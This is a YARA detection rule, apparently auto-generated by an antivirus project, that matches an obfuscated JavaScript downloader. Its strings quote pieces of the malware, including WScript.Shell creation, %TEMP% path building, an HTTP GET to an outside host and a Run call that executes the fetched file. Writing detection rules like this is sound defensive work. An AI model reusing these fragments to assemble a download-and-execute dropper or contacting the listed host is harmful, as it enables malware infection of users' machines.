rule sig_20160427_3a7fbe18b209cc905c39766afd6c4213 {
  meta:
    description = "datamaliciousorder - file 20160427_3a7fbe18b209cc905c39766afd6c4213.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9eeb96fe9bdbe509fad39c81ac6a6793a704bf65788e8081a729ff137fcea5fe"

  strings:
    $s1  = "function GzmplShtgo() {return HesmkHnutk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"lElvby4" ascii
    $s2  = "function GzmplShtgo() {return HesmkHnutk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"lElvby4" ascii
    $s3  = "function QuaxgHqyov(VvrpoLhyyi, PidifUvdcd){NpwaaGxgoo = NpwaaGxgoo * 1; return VvrpoLhyyi - PidifUvdcd;};" fullword ascii
    $s4  = "var HesmkHnutk = function IqrjlFmmjn() {return UgngyFzwbi[YnovrXbtpv](\"WScript\"+\".Shell\");}(), LluxbJxwmp = 11;" fullword ascii
    $s5  = "VakssTlszq[McbjyKnavx](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s6  = "var UgngyFzwbi = this[\"WScript\"];" fullword ascii
    $s7  = "if (VakssTlszq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function SrfpxVcpmf(){return ZkcjeXewzw + \"\";};" fullword ascii
    $s9  = "function EiphbQdccq() {return ((GoqygYrdbm == true) && (GoqygYrdbm == DwigqBpuzp)) ? 1 : NpwaaGxgoo;};" fullword ascii
    $s10 = "DwigqBpuzp = true; " fullword ascii
    $s11 = "}while (OpxinVvymr);" fullword ascii
    $s12 = "function WleutOosfe()" fullword ascii
    $s13 = "function SqutyNiqxw(){return YnovrXbtpv;};" fullword ascii
    $s14 = "var GoqygYrdbm = false;" fullword ascii
    $s15 = "GoqygYrdbm = true; " fullword ascii
    $s16 = "return QuaxgHqyov(TmmkbVsfov, MmcjmXvuqt);" fullword ascii
    $s17 = "var JyqzeKmnvd = false;" fullword ascii
    $s18 = "var FazuxClwhf = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function GkzipZstju(){return 23;};" fullword ascii
    $s20 = "function HebreFglrb(WtkfvUimae){HesmkHnutk[\"R\"+\"un\"](WtkfvUimae, NpwaaGxgoo, NpwaaGxgoo);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}